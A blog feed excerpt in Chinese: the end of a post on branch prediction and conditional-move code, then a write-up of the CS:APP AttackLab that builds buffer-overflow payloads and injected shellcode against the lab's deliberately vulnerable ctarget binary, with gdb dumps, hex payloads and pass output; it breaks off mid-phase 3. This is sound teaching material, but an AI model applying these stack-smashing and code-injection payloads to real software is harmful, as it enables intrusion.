title="分支预测和预测错误处罚"></a>分支预测和预测错误处罚</h4><p>在前面我们知道现代处理器会进行投机执行，也就是因为乱序执行的特性，现代处理器不一定只在执行<br>当年需要执行的指令，他可能在执行一些后面待执行的指令并把结果悬留下来等待使用，于是如果<br>在碰到分支的时候，就要预测进入或者不进入分支，如果预测失败就会导致前面做的工作全部丢掉<br>重新装填流水线，这个惩罚是比较严重的。为了避免这个结果，就要写出尽可能能让编译器翻译成条件<br>转移的代码，也就是先预先计算两个方向上的值，然后到确定的时候选择其中一个，这样就能最大限度减少<br>惩罚，因为猜测就算错误，我们还是预先计算出了待定的值。</p><h5 id="不要过分关心可预测的分支"><a href="#不要过分关心可预测的分支" class="headerlink" title="不要过分关心可预测的分支"></a>不要过分关心可预测的分支</h5><p>实际上GCC在这方面表现得还是比较聪明的，比如如果一个循环的话，一般情况下都会预测继续执行，如果是<br>边界检查的话，一般都预测为在边界内，所以可预测的分支不应该过分的关注，更应该关注那些随机的，不可预测<br>的分支。</p><h5 id="书写适合用条件传送实现的代码"><a href="#书写适合用条件传送实现的代码" class="headerlink" title="书写适合用条件传送实现的代码"></a>书写适合用条件传送实现的代码</h5><p>对于不可预测的分支，就应该书写更容易被GCC产生条件传送的代码。这一类代码往往都是更“功能性”的<br>，用条件才做来计算值，然后用这些值跟新状态。比如</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">minmax1</span><span class="params">(<span class="keyword">long</span> a[],<span class="keyword">long</span> b[],<span class="keyword">long</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">long</span> i;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(a[i]&gt;b[i])</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">long</span> t=a[i];</span><br><span class="line">      a[i]=b[i];</span><br><span class="line">      b[i]=t;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一类代码就不符合我们的预期，可以改成这样</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">minmax2</span><span class="params">(<span class="keyword">long</span> a[],<span class="keyword">long</span> b[],<span class="keyword">long</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">long</span> i;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">long</span> min=a[i]&lt;b[i]?a[i]:b[i];</span><br><span class="line">    <span class="keyword">long</span> max=a[i]&lt;b[i]?b[i]:a[i];</span><br><span class="line">    a[i]=min;</span><br><span class="line">    b[i]=max;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>事实上这样写是否符合我们的预期，还需要编译之后反编译看看汇编代码才能确定。之前的写法是否<br>符合预期，也要看GCC的优化是否发展到了足够的地步。总的来说，因为现代处理器的乱序执行的特性，<br>我们更期望使用条件转移或者其他办法来降低分支预测惩罚。</p><h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>事实上这一章节的内容可以分为这两方面，一是要尽量减少不必要的开销(例如函数掉用，循环开销等)，<br>二是要充分利用处理器的处理单元，尽量多的利用处理器的并行计算能力。基于这两点以及我们先前所知的<br>现代处理器具有”乱序执行”的能力的特点，去写出更容易被优化、更容易利用潜在的“并行”能力的代码。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;优化程序性能&quot;&gt;&lt;a href=&quot;#优化程序性能&quot; class=&quot;headerlink&quot; title=&quot;优化程序性能&quot;&gt;&lt;/a&gt;优化程序性能&lt;/h1&gt;&lt;p&gt;这一章因为没有对应的Lab,所以写一下总结防止自己遗忘,本章主要讲述了限制程序性能的一些因素以及如何去分析限
      
    
    </summary>
    
      <category term="Codeforces" scheme="lengyu.me/categories/Codeforces/"/>
    
    
      <category term="算法" scheme="lengyu.me/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="Codeforces" scheme="lengyu.me/tags/Codeforces/"/>
    
  </entry>
  
  <entry>
    <title>CS:APP AttackLab</title>
    <link href="lengyu.me/2018/09/05/CS:APP-AttackLab/"/>
    <id>lengyu.me/2018/09/05/CS:APP-AttackLab/</id>
    <published>2018-09-04T22:51:08.000Z</published>
    <updated>2019-07-28T15:41:39.012Z</updated>
    
    <content type="html"><![CDATA[<h1 id="AttackLab"><a href="#AttackLab" class="headerlink" title="AttackLab"></a>AttackLab</h1><h2 id="实验目标"><a href="#实验目标" class="headerlink" title="实验目标"></a>实验目标</h2><p>通过缓冲区溢出攻击实现相关的功能，体会缓冲区溢出攻击的威力。</p><h2 id="前置内容"><a href="#前置内容" class="headerlink" title="前置内容"></a>前置内容</h2><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p>disas 指令可以用于查看某一段内存之间的指令<br>gdb中可以通过set args来设置启动参数(此实验需要附带-q参数才能正常运行二进制文件)<br>run指令可以直接指定启动参数<br>其余指令在前面的lab中有提及</p><h3 id="大小端"><a href="#大小端" class="headerlink" title="大小端"></a>大小端</h3><p>intel系列处理器采用小端法，即低字节在低地址</p><h3 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h3><p>前面lab有提及，不再赘述</p><h3 id="材料准备"><a href="#材料准备" class="headerlink" title="材料准备"></a>材料准备</h3><p><a href>实验指导书</a><br><a href>实验材料</a></p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><h3 id="Code-Injection-Attacks"><a href="#Code-Injection-Attacks" class="headerlink" title="Code Injection Attacks"></a>Code Injection Attacks</h3><h4 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h4><p>对于Level1到Level3，在ctarget中是这样实现的。<br>利用test函数调用getbuf</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> val;</span><br><span class="line">  val = getbuf();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"No exploit.Getbuf returned 0x%x\n"</span>, val);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而getbuf是这样实现的</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">getbuf</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[BUFFER_SIZE];</span><br><span class="line">  Gets(buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实验给出的二进制文件在编译阶段通过一定的选项跳过了对栈区的保护，来让此实验可以完成。而BUFFER_SIZE则是在编译阶段决定的。<br>在Level1中需要利用缓冲区溢出攻击，将getbuf给hack掉，返回到touch1函数，而不是test函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vlevel = <span class="number">1</span>;</span><br><span class="line">  <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Touch1!: You called touch1()\n"</span>);</span><br><span class="line">  validate(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>为了实现这一目的，首先objdump查看汇编源代码，找到getbuf部分.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:48 83 ec 28          sub    $0x28,%rsp</span><br><span class="line">  4017ac:48 89 e7             mov    %rsp,%rdi</span><br><span class="line">  4017af:e8 8c 02 00 00       callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  4017b9:48 83 c4 28          add    $0x28,%rsp</span><br><span class="line">  4017bd:c3                   retq</span><br><span class="line">  4017be:90                   nop</span><br><span class="line">  4017bf:90                   nop</span><br></pre></td></tr></table></figure><p>我们可以看到首先给%rdi分配了0x28大小的空间，这一部分就是给buf分配空间，然后传入gets函数，调用结束后释放空间准备返回。于是我们输入的字符串就应该超过这一大小，将放回指令覆盖掉，以达到返回至touch1函数的效果。<br>打上断点调试一下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(gdb) x/30x $rsp</span><br><span class="line">0x5561dc78:0x333231300x000035340x000000000x00000000</span><br><span class="line">0x5561dc88:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x5561dc98:0x555860000x000000000x004019760x00000000</span><br><span class="line">0x5561dca8:0x000000020x000000000x00401f240x00000000</span><br><span class="line">0x5561dcb8:0x000000000x000000000xf4f4f4f40xf4f4f4f4</span><br><span class="line">0x5561dcc8:0xf4f4f4f40xf4f4f4f40xf4f4f4f40xf4f4f4f4</span><br><span class="line">0x5561dcd8:0xf4f4f4f40xf4f4f4f40xf4f4f4f40xf4f4f4f4</span><br><span class="line">0x5561dce8:0xf4f4f4f40xf4f4f4f4</span><br></pre></td></tr></table></figure><p>我们可以看到0x00401976存储了返回的地址，这段地址在距离栈顶0x28的位置。由于x86体系采用小端法存储，所以低位会存储在低字节。那么也就是说，前面的0x28个位置都不重要了！重要的是后面0x8字节的位置。<br>所以直接构造这样一个字符串(利用实验给出的hex2raw)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff</span><br><span class="line">ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff</span><br><span class="line">ff ff ff ff ff ff ff ff c0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>特别的，要注意大小端存放的顺序，注意实验指导书中使用hex2raw的例子。保存为level1.txt,进行实验.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  target1 ./hex2raw&lt;level1.txt | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">user idbovik</span><br><span class="line">course15213-f15</span><br><span class="line">labattacklab</span><br><span class="line">result1:PASS:0xffffffff:ctarget:1:FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF C0 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><p>可以看到顺利通过了实验。</p><h4 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h4><p>实验2类似与实验１，给出了touch2函数的c实现。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch2</span><span class="params">(<span class="keyword">unsigned</span> val)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vlevel = <span class="number">2</span>;<span class="comment">/* Part of validation protocol */</span></span><br><span class="line">  <span class="keyword">if</span> (val == cookie) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Touch2!: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">    validate(<span class="number">2</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Misfire: You called touch2(0x%.8x)\n"</span>, val);</span><br><span class="line">    fail(<span class="number">2</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但与实验1不同的是，这个实验要求必须将cookies作为参数传入touch2。此实验的难点在于如何插入一段自己的代码。我们仔细观察一下getbuf的汇编代码，思考解决问题的办法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:48 83 ec 28          sub    $0x28,%rsp</span><br><span class="line">  4017ac:48 89 e7             mov    %rsp,%rdi</span><br><span class="line">  4017af:e8 8c 02 00 00       callq  401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">  4017b9:48 83 c4 28          add    $0x28,%rsp</span><br><span class="line">  4017bd:c3                   retq</span><br><span class="line">  4017be:90                   nop</span><br><span class="line">  4017bf:90                   nop</span><br></pre></td></tr></table></figure><p>由于实验指导书中已经告诉我们，这个程序在编译阶段设置了一些参数来关闭了所有对溢出攻击的防护，于是我们猜测栈的地址是否没有随机化。通过gdb调试可以发现每一次%rsp的地址都是一致的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsp            0x5561dc780x5561dc78</span><br></pre></td></tr></table></figure><p>既然栈的位置固定，那一切都简单了许多。首先我们通过gets将我们需要执行的代码输入到栈上，接着覆盖掉返回地址到栈对应位置，这样返回之后就会执行我们对应的代码，这样有个限制，那就是我们可执行的代码长度受到栈长度的限制，这里限制为0x28字节。 　<br>现在的问题就是这段代码是什么？很简单，首先我们要将cookies设置到%rdi上，接着我们需要返回到touch2上。第二个问题是cookies存储在什么位置?我们观察touch2的汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">00000000004017ec &lt;touch2&gt;:</span><br><span class="line">  4017ec:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  4017f0:89 fa                mov    %edi,%edx</span><br><span class="line">  4017f2:c7 05 e0 2c 20 00 02 movl   $0x2,0x202ce0(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  4017f9:00 00 00</span><br><span class="line">  4017fc:3b 3d e2 2c 20 00    cmp    0x202ce2(%rip),%edi        # 6044e4 &lt;cookie&gt;</span><br><span class="line">  401802:75 20                jne    401824 &lt;touch2+0x38&gt;</span><br><span class="line">  401804:be e8 30 40 00       mov    $0x4030e8,%esi</span><br><span class="line">  401809:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  40180e:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401813:e8 d8 f5 ff ff       callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401818:bf 02 00 00 00       mov    $0x2,%edi</span><br><span class="line">  40181d:e8 6b 04 00 00       callq  401c8d &lt;validate&gt;</span><br><span class="line">  401822:eb 1e                jmp    401842 &lt;touch2+0x56&gt;</span><br><span class="line">  401824:be 10 31 40 00       mov    $0x403110,%esi</span><br><span class="line">  401829:bf 01 00 00 00       mov    $0x1,%edi</span><br><span class="line">  40182e:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  401833:e8 b8 f5 ff ff       callq  400df0 &lt;__printf_chk@plt&gt;</span><br><span class="line">  401838:bf 02 00 00 00       mov    $0x2,%edi</span><br><span class="line">  40183d:e8 0d 05 00 00       callq  401d4f &lt;fail&gt;</span><br><span class="line">  401842:bf 00 00 00 00       mov    $0x0,%edi</span><br><span class="line">  401847:e8 f4 f5 ff ff       callq  400e40 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure><p>发现cookies存储在0x202ce2(%rip)这个位置，那么一切都比较简单了，我们写出如下汇编代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movl 0x202ce2(%rip),%edi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>而我们知道ret返回的地址存储在栈上，那么就得仔细的考虑栈指针的位置。我们可以将touch2的调用地址写在第一次返回(getbuf处)的地址之前，然后将getbuf的返回地址设置到栈的我们的代码的对应位置，在代码中将%rsp减掉对应的大小指向存储touch2地址的地址，这样就能实现传参调用的功能了,但这样过于复杂，其实直接用push将对应的地址压入栈即可。于是修改汇编代码如下($6044e4是从objdump的注释处得到的)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">movl $6044e4,%edi</span><br><span class="line">pushq $0x4017ec</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>利用gcc将这段汇编代码翻译成机器码(实验指导书附录B),得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:48 8b 3c 25 e4 44 60 mov    0x6044e4,%rdi</span><br><span class="line">   7:00</span><br><span class="line">   8:68 ec 17 40 00       pushq  $0x4017ec</span><br><span class="line">   d:c3                   retq</span><br></pre></td></tr></table></figure><p>总共有0xb个字节，类似于实验１中我们可以写出这样的字节序列</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">48 8b 3c 25 e4 44 60 00 68 ec 17 40 00 c3 ff ff</span><br><span class="line">ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff</span><br><span class="line">ec 17 40 00 00 00 00 00 78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure><p>尝试运行，首先用hex2raw翻译成一串string，然后调用这串string，得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  target1 ./hex2raw&lt;level2.txt &gt;level2-raw.txt</span><br><span class="line">➜  target1 ./ctarget -q &lt;level2-raw.txt</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">user idbovik</span><br><span class="line">course15213-f15</span><br><span class="line">labattacklab</span><br><span class="line">result1:PASS:0xffffffff:ctarget:2:48 8B 3C 25 E4 44 60 00 68 EC 17 40 00 C3 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF EC 17 40 00 00 00 00 00 78 DC 61 55 00 00 00 00</span><br></pre></td></tr></table></figure><p>顺利通过</p><h4 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h4><p>实验3相比实验2又增加了一个要求，要求传入的不是cookie数字，而是一个cookie字符串,实验材料ctarget里面有一个hexmatch函数来进行比较</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">  <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">  <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">"%.8x"</span>, val);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vlevel = <span class="number">3</span>;</span><br><span class="line">  <span class="comment">/*Part of validation protocol */</span></span><br><span class="line">  <span class="keyword">if</span> (hexmatch(cookie,sval)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Touch3!:You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">    validate(<span class="number">3</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Misfire:You called touch3(\"%s\")\n"</span>, sval);</span><br><span class="line">    fail(<span class="number">3</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到touch3接受一个字符串指针，而hexmatch则有两个参数val和sval，这个函数比较val和sval字符串表示的数字的值是否一致。　　　</p><p><strong>cookie对于每一个人都是一致的，没必要在代码中进行val到sval的转化，直接硬编码</strong><br>因为没看清这一点，浪费了大量的时间。接着我们看到实验报告的advice里面提到，在hexmatch中可能会对栈区进行一部分数值改变，要谨慎的选择存放的位置。那么我们直接来看一下到底哪一些部分被改变了！　　<br>打上断点首先看一下初始栈状况(hexmatch之前)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x5561dc88:0x55685fe80x000000000x000000020x00000000</span><br><span class="line">0x5561dc98:0x004019160x000000000x555860000x00000000</span><br><span class="line">0x5561dca8:0x000000000x000000000x00401f240x00000000</span><br><span class="line">0x5561dcb8:0x000000000x000000000xf4f4f4f40xf4f4f4f4</span><br><span class="line">0x5561dcc8:0xf4f4f4f40xf4f4f4f40xf4f4f4f40xf4f4f4f4</span><br><span class="line">0x5561dcd8:0xf4f4f4f40xf4f4f4f40xf4f4f4f40xf4f4f4f4</span><br><span class="line">0x5561dce8:0xf4f4f4f40xf4f4f4f40xf4f4f4f40xf4f4f4f4</span><br><span class="line">0x5561dcf8:0xf4f4f4f40xf4f4f4f40xf4f4f4f40xf4f4f4f4</span><br><span class="line">0x5561dd08:0xf4f4f4f40xf4f4f4f40xf4f4f4f40xf4f4f4f4</span><br><span class="line">0x5561dd18:0xf4f4f4f40xf4f4f4f40xf4f4f4f40xf4f4f4f4</span><br><span class="line">0x5561dd28:0xf4f4f4f40xf4f4f4f40xf4f4f4f40xf4f4f4f4</span><br><span class="line">0x5561dd38:0xf4f4f4f40xf4f4f4f40xf4f4f4f40xf4f4f4f4</span><br><span class="line">0x5561dd48:0xf4f4f4f40xf4f4f4f40xf4f4f4f40xf4f4f4f4</span><br><span class="line">0x5561dd58:0xf4f4f4f40xf4f4f4f40xf4f4f4f40xf4f4f4f4</span><br><span class="line">0x5561dd68:0xf4f4f4f40xf4f4f4f40xf4f4f4f40xf4f4f4f4</span><br></pre></td></tr></table></figure><p>改变之后我们看看</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">0x5561dc00:0xf7a711480x00007fff0xf7dcfa000x00007fff</span><br><span class="line">0x5561dc10:0xf7dcc2a00x00007fff0x5561dc780x00000000</span><br><span class="line">0x5561dc20:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x5561dc30:0xf7a723f20x00007fff0x5561dc780x00000000</span><br><span class="line">0x5561dc40:0x5561dc780x000000000x5561dca80x00000000</span><br><span class="line">0x5561dc50:0x00401a8a0x000000000x555860000x00000000</span><br><span class="line">0x5561dc60:0x55685fe80x000000000x000000020x00000000</span><br><span class="line">0x5561dc70:0x004017b40x000000000x9f56c9000x66cda64c</span><br><span class="line">0x5561dc80:0xf7dcfa000x00007fff0x55685fe80x00000000</span><br><span class="line">0x5561dc90:0x000000020x000000000x004019160x00000000</span><br><span class="line">0x5561dca0:0x555860000x000000000x000000000x00000000</span><br><span class="line">0x5561dcb0:0x00401f240x000000000x000000000x00000000</span><br><span class="line">0x5561dcc0:0xf4f4f4f40xf4f4f4f40xf4f4f4f40xf4f4f4f4</span><br><span class="line">0x5561dcd0:0xf4f4f4f40xf4f4f4f40xf4f4f4f40xf4f4f4f4</span><br><span class="line">0x5561dce0:0xf4f4f4f40xf4f4f4f40xf4f4f4f40xf4f4f4f4</span><br></pre></td></tr></table></figure><p>我们可以看到从0x5561dcc0开始的部分都是被保留没有改变的，而我们在getbuf处读入的栈区开始的地址是0x5561dc78，中间有72(0x40)个字节的距离，而之前我们栈区申请了0x28空间，返回地址存放在0x28-0x30这段空间，所以我们后面填充0x10个无效字节之后就能填充我们需要的字符串了。　　<br>现在我们来仔细考虑一下我们的字符串应该怎么构造。首先是代码部分，我们直接将0x5561dcc0这个地址赋值给%rdi，然后我们压入touch3的地址，用ret进行跳转，也就是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov $0x5561dcc0,%rdi</span><br><span class="line">push touch3</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>接着，我们在0x28-0x30这段填入一个指向我们代码的地址，来让我们的代码能够得到执行。然后在0x40之后的地址填入cookie字符串。利用gcc和objdump我们得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:48 c7 c7 c0 dc 61 55 mov    $0x5561dcc0,%rdi</span><br><span class="line">   7:68 fa 18 40 00       pushq  